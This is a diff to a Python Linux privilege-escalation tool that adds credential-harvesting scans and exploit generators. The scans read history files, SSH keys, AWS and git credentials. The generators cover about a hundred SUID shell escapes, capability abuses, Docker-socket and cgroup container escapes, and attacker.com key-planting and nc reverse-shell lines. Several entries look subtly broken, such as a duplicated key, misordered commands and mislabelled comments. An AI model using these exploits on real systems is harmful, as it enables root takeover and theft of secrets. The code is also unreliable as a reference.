@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # LPEAssessor - Linux Privilege Escalation Assessment Tool
-# Version: 1.3.0
+# Version: 1.3.1
 # Author: Tommaso Bona
 # License: MIT
 # Description: Comprehensive tool for detecting, verifying, and exploiting Linux privilege escalation vulnerabilities.
@@ -207,7 +207,7 @@ class VulnerabilityScanner:
     def start_scan(self):
         """Main method to start vulnerability scanning with improved thread management"""
         self.logger.log(LogLevel.INFO, "Starting vulnerability scan...")
-    
+
         scan_methods = [
             self.scan_suid_binaries,
             self.scan_sgid_binaries,
@@ -220,9 +220,15 @@ class VulnerabilityScanner:
             self.scan_scheduled_tasks,
             self.scan_sudo_permissions,
             self.scan_exposed_services,
-            self.scan_path_hijacking
+            self.scan_path_hijacking,
+            # LinPEAS-style methods
+            self.scan_history_files,
+            self.scan_ssh_files,
+            self.scan_interesting_files,
+            self.scan_capabilities,
+            self.scan_containers
         ]
-    
+
         # Run each method with individual timeout instead of starting all threads at once
         for method in scan_methods:
             method_name = method.__name__
@@ -238,8 +244,367 @@ class VulnerabilityScanner:
         
             if thread.is_alive():
                 self.logger.log(LogLevel.WARNING, f"{method_name} timed out after {method_timeout} seconds, continuing with next scan")
-    
+
         return self.vulnerabilities
+    
+    def scan_history_files(self):
+        """Scan for sensitive information in history files (LinPEAS-style)"""
+        self.logger.log(LogLevel.INFO, "Scanning history files for sensitive information...")
+        
+        # Common history files to check
+        history_files = [
+            '~/.bash_history',
+            '~/.zsh_history',
+            '~/.python_history',
+            '~/.mysql_history',
+            '~/.psql_history',
+            '/.ash_history',
+            '~/.history',
+            '~/.sh_history'
+        ]
+        
+        # Patterns to look for
+        sensitive_patterns = [
+            r'(?i)passwd',
+            r'(?i)ssh-add',
+            r'(?i)ssh\s+.*\s+\-i',
+            r'(?i)curl\s+.*\s+\-u\s+[^\s]+:[^\s]+',
+            r'(?i)wget\s+.*\s+\-\-password',
+            r'(?i)mysql\s+\-u\s+root\s+\-p',
+            r'(?i)psql\s+\-U\s+[^\s]+\s+\-W',
+            r'(?i)dump(db|sql)',
+            r'(?i)auth(entication)?\.json',
+            r'(?i)id_rsa',
+            r'(?i)\.key',
+            r'(?i)\.crt'
+        ]
+        
+        for history_file in history_files:
+            expanded_path = os.path.expanduser(history_file)
+            if os.path.exists(expanded_path) and os.access(expanded_path, os.R_OK):
+                try:
+                    with open(expanded_path, 'r', errors='ignore') as f:
+                        content = f.read()
+                        
+                    for pattern in sensitive_patterns:
+                        matches = re.findall(pattern, content)
+                        if matches:
+                            vuln = {
+                                'type': 'history_file_exposure',
+                                'path': expanded_path,
+                                'pattern': pattern,
+                                'matches': matches[:5],  # Limit to first 5 matches
+                                'is_exploitable': True
+                            }
+                            
+                            self.logger.log(LogLevel.SUCCESS, f"Found sensitive information in history file: {expanded_path}")
+                            self.logger.log(LogLevel.INFO, f"  Pattern: {pattern}")
+                            self.logger.log(LogLevel.INFO, f"  Matches: {', '.join(matches[:5])}")
+                            
+                            self.vulnerabilities.append(vuln)
+                except Exception as e:
+                    self.logger.log(LogLevel.DEBUG, f"Error reading history file {expanded_path}: {e}")
+
+    def scan_ssh_files(self):
+        """Scan for SSH keys with weak permissions (LinPEAS-style)"""
+        self.logger.log(LogLevel.INFO, "Scanning for SSH keys with weak permissions...")
+        
+        # Look for SSH key files
+        ssh_locations = [
+            '~/.ssh',
+            '/etc/ssh',
+            '/home/*/.ssh',
+            '/root/.ssh'
+        ]
+        
+        ssh_files = []
+        for location in ssh_locations:
+            expanded_path = os.path.expanduser(location)
+            try:
+                if os.path.isdir(expanded_path):
+                    for root, dirs, files in os.walk(expanded_path):
+                        for filename in files:
+                            if filename in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'identity', 'authorized_keys', 'known_hosts']:
+                                ssh_files.append(os.path.join(root, filename))
+                elif os.path.isfile(expanded_path) and os.access(expanded_path, os.R_OK):
+                    ssh_files.append(expanded_path)
+            except Exception as e:
+                self.logger.log(LogLevel.DEBUG, f"Error accessing SSH location {location}: {e}")
+        
+        for ssh_file in ssh_files:
+            try:
+                # Check permissions
+                if os.access(ssh_file, os.R_OK):
+                    file_stat = os.stat(ssh_file)
+                    file_perms = oct(file_stat.st_mode)[-4:]
+                    
+                    # SSH private keys should have 0600 permissions
+                    is_private_key = any(key_type in ssh_file for key_type in ['id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'identity'])
+                    is_overly_permissive = False
+                    
+                    if is_private_key and file_perms != '0600':
+                        is_overly_permissive = True
+                        
+                    # SSH config file should have 0644 permissions at most
+                    is_config = 'config' in ssh_file
+                    if is_config and int(file_perms[-3:], 8) > 644:
+                        is_overly_permissive = True
+                    
+                    if is_overly_permissive:
+                        # Get ownership information
+                        try:
+                            owner = pwd.getpwuid(file_stat.st_uid).pw_name
+                        except:
+                            owner = str(file_stat.st_uid)
+                        
+                        try:
+                            group = grp.getgrgid(file_stat.st_gid).gr_name
+                        except:
+                            group = str(file_stat.st_gid)
+                        
+                        vuln = {
+                            'type': 'ssh_key_weak_permissions',
+                            'path': ssh_file,
+                            'permissions': file_perms,
+                            'owner': owner,
+                            'group': group,
+                            'is_private_key': is_private_key,
+                            'is_exploitable': True
+                        }
+                        
+                        self.logger.log(LogLevel.SUCCESS, f"Found SSH {'private key' if is_private_key else 'file'} with weak permissions: {ssh_file}")
+                        self.logger.log(LogLevel.INFO, f"  Permissions: {file_perms}, Expected: {'0600' if is_private_key else '0644 or less'}")
+                        
+                        self.vulnerabilities.append(vuln)
+                        
+                    # Check if this is a private key and we can read it
+                    if is_private_key and os.access(ssh_file, os.R_OK):
+                        vuln = {
+                            'type': 'readable_ssh_private_key',
+                            'path': ssh_file,
+                            'owner': owner if 'owner' in locals() else 'unknown',
+                            'is_exploitable': True
+                        }
+                        
+                        self.logger.log(LogLevel.SUCCESS, f"Found readable SSH private key: {ssh_file}")
+                        self.vulnerabilities.append(vuln)
+            except Exception as e:
+                self.logger.log(LogLevel.DEBUG, f"Error checking SSH file {ssh_file}: {e}")
+
+    def scan_interesting_files(self):
+        """Scan for interesting files that might contain sensitive information (LinPEAS-style)"""
+        self.logger.log(LogLevel.INFO, "Scanning for interesting files with sensitive information...")
+        
+        # Files that might contain interesting information
+        interesting_files = [
+            '/etc/fstab',
+            '/etc/mtab',
+            '/etc/exports',
+            '/var/mail/*',
+            '/var/spool/mail/*',
+            '/var/spool/cron/*',
+            '/var/backup/*',
+            '/var/www/html/wp-config.php',
+            '/var/www/html/config.php',
+            '/etc/httpd/conf/httpd.conf',
+            '/etc/apache2/apache2.conf',
+            '/etc/nginx/nginx.conf',
+            '/etc/nginx/sites-enabled/*',
+            '/etc/supervisor/conf.d/*',
+            '~/.aws/credentials',
+            '~/.aws/config',
+            '~/.git-credentials',
+            '~/.gitconfig',
+            '~/.docker/config.json',
+            '/etc/letsencrypt/live/*'
+        ]
+        
+        for interesting_file in interesting_files:
+            try:
+                expanded_path = os.path.expanduser(interesting_file)
+                # Handle wildcards in paths
+                if '*' in expanded_path:
+                    matching_files = glob.glob(expanded_path)
+                    for match in matching_files:
+                        self._check_interesting_file(match)
+                elif os.path.exists(expanded_path):
+                    self._check_interesting_file(expanded_path)
+            except Exception as e:
+                self.logger.log(LogLevel.DEBUG, f"Error checking interesting file {interesting_file}: {e}")
+        
+    def _check_interesting_file(self, file_path):
+        """Check if a file contains sensitive information or has weak permissions"""
+        try:
+            if os.path.isfile(file_path) and os.access(file_path, os.R_OK):
+                file_stat = os.stat(file_path)
+                
+                # Get ownership information
+                try:
+                    owner = pwd.getpwuid(file_stat.st_uid).pw_name
+                except:
+                    owner = str(file_stat.st_uid)
+                
+                try:
+                    group = grp.getgrgid(file_stat.st_gid).gr_name
+                except:
+                    group = str(file_stat.st_gid)
+                
+                # Check for sensitive patterns if the file is readable
+                with open(file_path, 'r', errors='ignore') as f:
+                    # Read only a portion of the file to avoid large files
+                    content = f.read(10000)
+                    
+                    # Check for sensitive patterns
+                    sensitive_found = False
+                    sensitive_matches = []
+                    
+                    # Patterns to look for in interesting files
+                    sensitive_patterns = [
+                        r'(?i)password\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)secret\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)key\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)pass\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)username\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)credential\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)database\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)token\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)api[_\s]?key\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?',
+                        r'(?i)ftp',
+                        r'(?i)jdbc',
+                        r'(?i)ssh',
+                        r'PRIVATE KEY'
+                    ]
+                    
+                    for pattern in sensitive_patterns:
+                        matches = re.findall(pattern, content)
+                        if matches:
+                            sensitive_found = True
+                            sensitive_matches.extend([match for match in matches if match])
+                    
+                    if sensitive_found:
+                        vuln = {
+                            'type': 'sensitive_info_exposure',
+                            'path': file_path,
+                            'owner': owner,
+                            'group': group,
+                            'permissions': oct(file_stat.st_mode)[-4:],
+                            'sensitive_matches': sensitive_matches[:5],  # Limit to first 5 matches
+                            'is_exploitable': True
+                        }
+                        
+                        self.logger.log(LogLevel.SUCCESS, f"Found sensitive information in: {file_path}")
+                        for match in sensitive_matches[:5]:
+                            self.logger.log(LogLevel.INFO, f"  Match: {match}")
+                        
+                        self.vulnerabilities.append(vuln)
+        except Exception as e:
+            self.logger.log(LogLevel.DEBUG, f"Error checking interesting file {file_path}: {e}")
+
+    def scan_capabilities(self):
+        """Scan for binaries with dangerous capabilities (LinPEAS-style)"""
+        self.logger.log(LogLevel.INFO, "Scanning for binaries with dangerous capabilities...")
+        
+        try:
+            # Check if getcap command is available
+            if self._command_exists('getcap'):
+                # Run getcap to find all binaries with capabilities
+                getcap_output = subprocess.check_output(['getcap', '-r', '/', '2>/dev/null'], 
+                                                    shell=True, stderr=subprocess.PIPE).decode('utf-8')
+                
+                # Dangerous capabilities
+                dangerous_caps = [
+                    'cap_setuid', 'cap_setgid', 'cap_dac_override', 
+                    'cap_dac_read_search', 'cap_sys_admin', 'cap_sys_ptrace',
+                    'cap_chown', 'cap_fowner', 'cap_sys_module'
+                ]
+                
+                for line in getcap_output.split('\n'):
+                    if not line.strip():
+                        continue
+                        
+                    # Parse the line to get binary path and capabilities
+                    parts = line.split(' ', 1)
+                    if len(parts) != 2:
+                        continue
+                        
+                    binary_path, capabilities = parts
+                    
+                    # Check if any dangerous capability is present
+                    is_dangerous = any(cap in capabilities for cap in dangerous_caps)
+                    
+                    if is_dangerous:
+                        vuln = {
+                            'type': 'dangerous_capability',
+                            'path': binary_path,
+                            'capabilities': capabilities,
+                            'is_exploitable': True
+                        }
+                        
+                        self.logger.log(LogLevel.SUCCESS, f"Found binary with dangerous capabilities: {binary_path}")
+                        self.logger.log(LogLevel.INFO, f"  Capabilities: {capabilities}")
+                        
+                        self.vulnerabilities.append(vuln)
+        except Exception as e:
+            self.logger.log(LogLevel.DEBUG, f"Error scanning for capabilities: {e}")
+        
+    def _command_exists(self, command):
+        """Check if a command exists in the system"""
+        try:
+            subprocess.check_output(['which', command], stderr=subprocess.PIPE)
+            return True
+        except:
+            return False
+
+    def scan_containers(self):
+        """Scan for container-related vulnerabilities (LinPEAS-style)"""
+        self.logger.log(LogLevel.INFO, "Scanning for container-related vulnerabilities...")
+        
+        # Check for Docker socket
+        docker_socket = '/var/run/docker.sock'
+        if os.path.exists(docker_socket) and os.access(docker_socket, os.R_OK):
+            vuln = {
+                'type': 'accessible_docker_socket',
+                'path': docker_socket,
+                'is_exploitable': True
+            }
+            
+            self.logger.log(LogLevel.SUCCESS, f"Found accessible Docker socket: {docker_socket}")
+            self.logger.log(LogLevel.INFO, "  This can be exploited to escape container or gain privileges")
+            
+            self.vulnerabilities.append(vuln)
+        
+        # Check for .dockerenv file (indicates we're in a container)
+        if os.path.exists('/.dockerenv'):
+            vuln = {
+                'type': 'inside_docker_container',
+                'path': '/.dockerenv',
+                'is_exploitable': False  # Not directly exploitable, but useful information
+            }
+            
+            self.logger.log(LogLevel.INFO, "Running inside a Docker container")
+            self.vulnerabilities.append(vuln)
+        
+        # Check container capabilities and security profiles
+        try:
+            if os.path.exists('/proc/self/status'):
+                with open('/proc/self/status', 'r') as f:
+                    status_content = f.read()
+                    
+                    # Check for privileged container (all capabilities)
+                    if 'CapEff:\t0000003fffffffff' in status_content or 'CapEff:\t0000001fffffffff' in status_content:
+                        vuln = {
+                            'type': 'privileged_container',
+                            'capabilities': 'All capabilities enabled',
+                            'is_exploitable': True
+                        }
+                        
+                        self.logger.log(LogLevel.SUCCESS, "Container is running in privileged mode!")
+                        self.logger.log(LogLevel.INFO, "  This can be exploited to escape the container")
+                        
+                        self.vulnerabilities.append(vuln)
+        except Exception as e:
+            self.logger.log(LogLevel.DEBUG, f"Error checking container capabilities: {e}")
     
     def scan_suid_binaries(self):
         """Scan for SUID binaries that can be exploited with verification"""
@@ -248,15 +613,109 @@ class VulnerabilityScanner:
         
         # Common SUID binaries that can be used for privilege escalation
         exploitable_suid_binaries = {
-            'nmap': '--interactive and !sh',
-            'vim': '-c ":py import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'reset; exec sh\')"',
-            'find': '. -exec /bin/sh \\; -quit',
-            'bash': '-p',
-            'less': '!/bin/sh',
-            'nano': '^R^X reset; sh 1>&0 2>&0',
-            'cp': 'source_file /etc/shadow',
-            'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\''
-        }
+        'nmap': '--interactive and !sh',
+        'vim': '-c ":py import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'reset; exec sh\')"',
+        'find': '. -exec /bin/sh \\; -quit',
+        'bash': '-p',
+        'less': '!/bin/sh',
+        'nano': '^R^X reset; sh 1>&0 2>&0',
+        'cp': 'source_file /etc/shadow',
+        'python': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
+        
+        # Additional GTFOBins entries
+        'aria2c': '-d /root --allow-overwrite -o .ssh/authorized_keys "http://attacker.com/ssh-key"',
+        'arp': '-v -f /etc/shadow',
+        'ash': '-p',
+        'awk': 'BEGIN {system("/bin/sh")}',
+        'base64': '-d <<< "Y2F0IC9ldGMvc2hhZG93Cg=="', # Decodes to execute commands
+        'busybox': 'sh -p',
+        'chmod': '4755 /bin/bash',
+        'chown': 'root:root /bin/bash',
+        'csh': '-b',
+        'curl': '-o /root/.ssh/authorized_keys http://attacker.com/ssh-key',
+        'date': '-f /etc/shadow',
+        'dd': 'if=/etc/shadow of=/dev/stdout',
+        'dialog': '--textbox "/etc/shadow" 0 0',
+        'diff': '/dev/null /etc/shadow',
+        'docker': 'run -v /:/mnt --rm -it alpine chroot /mnt sh',
+        'emacs': '-Q -nw --eval \'(term "/bin/sh -p")\'',
+        'env': 'SUDO_ASKPASS=/bin/sh sudo -A',
+        'expand': '/etc/shadow',
+        'expect': '-c "spawn /bin/sh -p; interact"',
+        'facter': '-p os.users.root.password_hash',
+        'file': '--command /bin/sh',
+        'flock': '-u / /bin/sh -p',
+        'fmt': '/etc/shadow',
+        'fold': '/etc/shadow',
+        'gawk': 'BEGIN {system("/bin/sh")}',
+        'gdb': '-nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
+        'gimp': '-idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
+        'grep': '"" /etc/shadow',
+        'head': '/etc/shadow',
+        'ionice': '/bin/sh -p',
+        'ip': 'netns add foo && ip netns exec foo /bin/sh -p && ip netns delete foo',
+        'jjs': '-e "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p\',[\'/bin/sh\']);"',
+        'jq': '-n \'system("/bin/sh")\'',
+        'jrunscript': '-e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p\')"',
+        'ksh': '-p',
+        'ld.so': '/bin/sh -p',
+        'logsave': '/dev/null /bin/sh -i -p',
+        'lua': '-e \'os.execute("/bin/sh")\'',
+        'make': '-s --eval=$\'x:\\n\\t-\'"/bin/sh -p"',
+        'mawk': 'BEGIN {system("/bin/sh")}',
+        'more': '!/bin/sh',
+        'mount': '-o bind /bin/bash /bin/mount && /bin/mount -p',
+        'mysql': '-e "\\! /bin/sh"',
+        'nc': '-e /bin/sh attackerip 4444',
+        'nice': '/bin/sh -p',
+        'nl': '/etc/shadow',
+        'node': '-e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
+        'nohup': '/bin/sh -p -c "nohup /bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"',
+        'openssl': 'enc -in /etc/shadow -out /dev/stdout',
+        'perl': '-e \'exec "/bin/sh";\'',
+        'pg': '/etc/shadow',
+        'php': '-r "system(\'/bin/sh\');"',
+        'pico': '^R^X reset; sh 1>&0 2>&0',
+        'pip': 'install --upgrade --force-reinstall --editable=`mktemp -d`',
+        'puppet': 'apply -e "exec { \'/bin/sh -pc \\\\$@|sh\\\\${IFS}-p _ echo sh -p\': }"',
+        'python2': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
+        'python3': '-c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
+        'rlwrap': '-H /dev/null /bin/sh -p',
+        'rsync': '-e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/',
+        'ruby': '-e \'exec "/bin/sh"\'',
+        'run-parts': '--new-session --regex \'^sh$\' /bin --arg=\'-p\'',
+        'rview': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
+        'rvim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
+        'sed': '-i\'s/x/y/e\' /etc/shadow',
+        'setarch': '$(arch) /bin/sh -p',
+        'socat': 'FILE:`tty`,raw,echo=0 EXEC:"sh -p",pty,stderr,setsid,sigint,sane',
+        'sqlite3': '\'.shell /bin/sh -p\'',
+        'stdbuf': '-i0 /bin/sh -p',
+        'strace': '-o /dev/null /bin/sh -p',
+        'systemctl': 'link /bin/sh /tmp/systemctl && /tmp/systemctl',
+        'tail': '/etc/shadow',
+        'tar': '-cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh',
+        'taskset': '1 /bin/sh -p',
+        'tclsh': 'exec /bin/sh -p <@stdin >@stdout 2>@stderr',
+        'time': '/bin/sh -p',
+        'timeout': '7d /bin/sh -p',
+        'ul': '/etc/shadow',
+        'unexpand': '/etc/shadow',
+        'uniq': '/etc/shadow',
+        'unshare': '-r /bin/sh',
+        'view': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
+        'vigr': '',  # Just running it gives elevated access to /etc/group
+        'vim': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
+        'vimdiff': '-c \':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")\'',
+        'vipw': '',  # Just running it gives elevated access to /etc/passwd
+        'watch': '-x sh -c \'reset; exec sh 1>&0 2>&0\'',
+        'wget': '--use-askpass=/bin/sh',
+        'xargs': '-a /dev/null sh -p',
+        'xxd': '/etc/shadow | xxd -r',
+        'zsh': '',
+        'zip': '-q /tmp/test.zip . -T -TT \'sh #\'',
+        'zsoelim': '/etc/shadow'
+    }
     
         # Use multiple threads to scan the filesystem faster
         paths_to_scan = []
@@ -1293,42 +1752,202 @@ class ExploitManager:
     
         return self.exploits
     
-    def exploit_suid_binary(self, vulns):
-        """Generate exploits for SUID binary vulnerabilities"""
+    def exploit_history_file_exposure(self, vulns):
+        """Generate exploits for history file exposures"""
         exploits = []
+        
+        for vuln in vulns:
+            file_path = vuln.get('path')
+            matches = vuln.get('matches', [])
+            
+            exploit = {
+                'type': 'history_file_exposure',
+                'vulnerability': vuln,
+                'command': f"cat {file_path} | grep -E '(password|ssh|key|token)'",
+                'description': f"Extract sensitive information from history file {file_path}"
+            }
+            
+            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for history file exposure")
+            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+            
+            exploits.append(exploit)
+        
+        return exploits
+
+    def exploit_ssh_key_weak_permissions(self, vulns):
+        """Generate exploits for SSH keys with weak permissions"""
+        exploits = []
+        
+        for vuln in vulns:
+            file_path = vuln.get('path')
+            
+            if 'id_rsa' in file_path or 'id_dsa' in file_path or 'id_ecdsa' in file_path or 'id_ed25519' in file_path:
+                exploit = {
+                    'type': 'ssh_key_weak_permissions',
+                    'vulnerability': vuln,
+                    'command': f"cat {file_path}",
+                    'description': f"Extract private key from {file_path} for unauthorized SSH access"
+                }
+                
+                self.logger.log(LogLevel.SUCCESS, f"Generated exploit for weak SSH key permissions")
+                self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+                
+                exploits.append(exploit)
+        
+        return exploits
+
+    def exploit_readable_ssh_private_key(self, vulns):
+        """Generate exploits for readable SSH private keys"""
+        exploits = []
+        
+        for vuln in vulns:
+            file_path = vuln.get('path')
+            
+            exploit = {
+                'type': 'readable_ssh_private_key',
+                'vulnerability': vuln,
+                'command': f"cat {file_path}",
+                'description': f"Extract private key from {file_path} for SSH access"
+            }
+            
+            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for readable SSH private key")
+            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+            
+            exploits.append(exploit)
+        
+        return exploits
+
+    def exploit_sensitive_info_exposure(self, vulns):
+        """Generate exploits for sensitive information exposure"""
+        exploits = []
+        
+        for vuln in vulns:
+            file_path = vuln.get('path')
+            matches = vuln.get('sensitive_matches', [])
+            
+            exploit = {
+                'type': 'sensitive_info_exposure',
+                'vulnerability': vuln,
+                'command': f"cat {file_path}",
+                'description': f"Extract sensitive information from {file_path}"
+            }
+            
+            self.logger.log(LogLevel.SUCCESS, f"Generated exploit for sensitive information exposure")
+            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+            
+            exploits.append(exploit)
+        
+        return exploits
+
+    def exploit_dangerous_capability(self, vulns):
+        """Generate exploits for binaries with dangerous capabilities"""
+        exploits = []
+        
+        # Map of capabilities to exploit methods
+        capability_exploits = {
+            'cap_setuid': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";\'',
+            'cap_setgid': 'perl -e \'use POSIX qw(setgid); POSIX::setgid(0); exec "/bin/sh";\'',
+            'cap_dac_override': 'cp /etc/shadow /tmp/shadow_copy || cat /etc/shadow',
+            'cap_dac_read_search': 'cat /etc/shadow',
+            'cap_sys_admin': 'mount -t tmpfs tmpfs /mnt && cp /bin/bash /mnt/bash && chmod +s /mnt/bash && /mnt/bash -p',
+            'cap_sys_ptrace': 'echo "void main() { setuid(0); system(\"/bin/bash\"); }" > /tmp/ptrace.c && gcc /tmp/ptrace.c -o /tmp/ptrace && /tmp/ptrace',
+            'cap_chown': 'chown root:root /bin/bash && chmod +s /bin/bash',
+            'cap_fowner': 'chmod +s /bin/bash',
+            'cap_sys_module': 'echo "void init(void) { system(\"/bin/bash\"); }" > /tmp/mod.c && gcc -fPIC -shared -o /tmp/mod.so /tmp/mod.c && insmod /tmp/mod.so'
+        }
+        
+        for vuln in vulns:
+            binary_path = vuln.get('path')
+            capabilities = vuln.get('capabilities', '')
+            
+            # Find the first dangerous capability that's present
+            for cap, exploit_cmd in capability_exploits.items():
+                if cap in capabilities:
+                    exploit = {
+                        'type': 'dangerous_capability',
+                        'vulnerability': vuln,
+                        'command': f"{binary_path} {exploit_cmd}",
+                        'description': f"Exploit {cap} capability on {binary_path} to gain elevated privileges"
+                    }
+                    
+                    self.logger.log(LogLevel.SUCCESS, f"Generated exploit for dangerous capability {cap}")
+                    self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+                    
+                    exploits.append(exploit)
+                    break
+        
+        return exploits
+
+    def exploit_accessible_docker_socket(self, vulns):
+        """Generate exploits for accessible Docker socket"""
+        exploits = []
+        
+        for vuln in vulns:
+            exploit = {
+                'type': 'accessible_docker_socket',
+                'vulnerability': vuln,
+                'command': "docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host bash",
+                'description': "Use Docker socket to mount host filesystem and get root access"
+            }
+            
+            self.logger.log(LogLevel.SUCCESS, "Generated exploit for accessible Docker socket")
+            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+            
+            exploits.append(exploit)
+        
+        return exploits
+
+    def exploit_privileged_container(self, vulns):
+        """Generate exploits for privileged container"""
+        exploits = []
+        
+        for vuln in vulns:
+            exploit = {
+                'type': 'privileged_container',
+                'vulnerability': vuln,
+                'command': "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` && echo \"$host_path/cmd\" > /tmp/cgrp/release_agent && echo '#!/bin/sh\\nchmod +s /bin/bash' > /cmd && chmod a+x /cmd && sh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\" && sleep 1 && /bin/bash -p",
+                'description': "Escape from privileged container to get root on the host system"
+            }
+            
+            self.logger.log(LogLevel.SUCCESS, "Generated exploit for privileged container")
+            self.logger.log(LogLevel.INFO, f"  Command: {exploit['command']}")
+            
+            exploits.append(exploit)
+        
+        return exploits
+    
+    def exploit_suid_binary(self, vulns):
+        """Generate exploits for SUID binary vulnerabilities using GTFOBins techniques"""
+        exploits = []
+        
+        # The exploitable_suid_binaries dictionary is already defined in scan_suid_binaries
+        # and the exploit_method should be populated for each vulnerability
         
         for vuln in vulns:
             binary_path = vuln.get('path')
             binary_name = os.path.basename(binary_path)
             exploit_method = vuln.get('exploit_method', '')
             
-            if not exploit_method:
-                # Determine exploit method based on binary name
-                if binary_name == 'find':
-                    exploit_method = '. -exec /bin/sh \\; -quit'
-                elif binary_name == 'vim' or binary_name == 'vi':
-                    exploit_method = '-c ":py import os; os.execl(\'/bin/sh\', \'sh\', \'-c\', \'reset; exec sh\')"'
-                elif binary_name == 'bash':
-                    exploit_method = '-p'
-                elif binary_name == 'less' or binary_name == 'more':
-                    exploit_method = '!/bin/sh'
-                elif binary_name == 'nmap':
-                    exploit_method = '--interactive'
-                elif binary_name == 'python' or binary_name == 'python3':
-                    exploit_method = '-c \'import os; os.execl("/bin/sh", "sh", "-p")\''
-                elif binary_name == 'perl':
-                    exploit_method = '-e \'exec "/bin/sh";\'',
-                elif binary_name == 'ruby':
-                    exploit_method = '-e \'exec "/bin/sh"\''
-                elif binary_name == 'nano':
-                    exploit_method = '^R^X reset; sh 1>&0 2>&0'
-            
             if exploit_method:
+                # Descriptive exploit messages based on binary type
+                if binary_name in ['python', 'python2', 'python3', 'perl', 'ruby', 'php']:
+                    description = f"Exploit SUID {binary_name} to execute commands with elevated privileges"
+                elif binary_name in ['tar', 'zip', 'rsync']:
+                    description = f"Exploit SUID {binary_name} to execute commands during archive operations"
+                elif binary_name in ['vim', 'vi', 'nano', 'emacs', 'view', 'rview', 'rvim', 'vimdiff', 'pico']:
+                    description = f"Break out to privileged shell from SUID {binary_name} editor"
+                elif binary_name in ['mysql', 'sqlite3']:
+                    description = f"Execute commands with privileges of SUID {binary_name} database"
+                elif binary_name in ['docker']:
+                    description = f"Escape container and gain root access with SUID {binary_name}"
+                else:
+                    description = f"Exploit SUID binary {binary_name} to get a shell with elevated privileges"
+                
                 exploit = {
                     'type': 'suid_binary',
                     'vulnerability': vuln,
                     'command': f"{binary_path} {exploit_method}",
-                    'description': f"Exploit SUID binary {binary_name} to get a shell with elevated privileges"
+                    'description': description
                 }
                 
                 self.logger.log(LogLevel.SUCCESS, f"Generated exploit for SUID binary {binary_name}")
@@ -1340,8 +1959,45 @@ class ExploitManager:
     
     def exploit_sgid_binary(self, vulns):
         """Generate exploits for SGID binary vulnerabilities"""
-        # Similar to SUID binary exploit but for SGID
-        return self.exploit_suid_binary(vulns)
+        exploits = []
+        
+        for vuln in vulns:
+            binary_path = vuln.get('path')
+            binary_name = os.path.basename(binary_path)
+            group = vuln.get('group', 'unknown')
+            
+            # Most exploit methods for SUID also work for SGID
+            exploit_method = vuln.get('exploit_method', '')
+            
+            if exploit_method:
+                # Create specialized descriptions for SGID binaries
+                if binary_name in ['python', 'python2', 'python3', 'perl', 'ruby', 'php']:
+                    description = f"Exploit SGID {binary_name} to execute commands with {group} group privileges"
+                elif binary_name in ['tar', 'zip', 'rsync']:
+                    description = f"Exploit SGID {binary_name} to access files with {group} group permissions"
+                elif binary_name in ['vim', 'vi', 'nano', 'emacs', 'view', 'rview', 'rvim', 'vimdiff', 'pico']:
+                    description = f"Use SGID {binary_name} editor to access files restricted to {group} group"
+                elif binary_name in ['find', 'grep', 'cat', 'head', 'tail']:
+                    description = f"Use SGID {binary_name} to read files accessible to {group} group"
+                elif binary_name in ['mysql', 'sqlite3']:
+                    description = f"Execute commands with {group} group privileges via SGID {binary_name}"
+                else:
+                    description = f"Exploit SGID binary {binary_name} to gain {group} group privileges"
+                
+                exploit = {
+                    'type': 'sgid_binary',
+                    'vulnerability': vuln,
+                    'command': f"{binary_path} {exploit_method}",
+                    'description': description
+                }
+                
